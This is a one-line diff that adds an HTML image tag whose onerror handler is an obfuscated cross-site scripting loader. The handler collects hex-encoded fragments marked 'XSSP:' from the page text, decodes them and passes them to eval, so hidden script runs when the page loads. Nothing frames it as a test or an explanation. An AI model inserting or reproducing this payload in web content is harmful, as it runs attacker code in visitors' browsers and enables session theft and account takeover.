@@ -1,0 +1,1 @@
+<img src=x onerror="eval(document.body.textContent.match(/XSSP:[0-9]+:[0-9a-f]+/g).map(x=>x.split(':')[2]).join('').replace(/../g,x=>String.fromCharCode(parseInt(x,16))))">
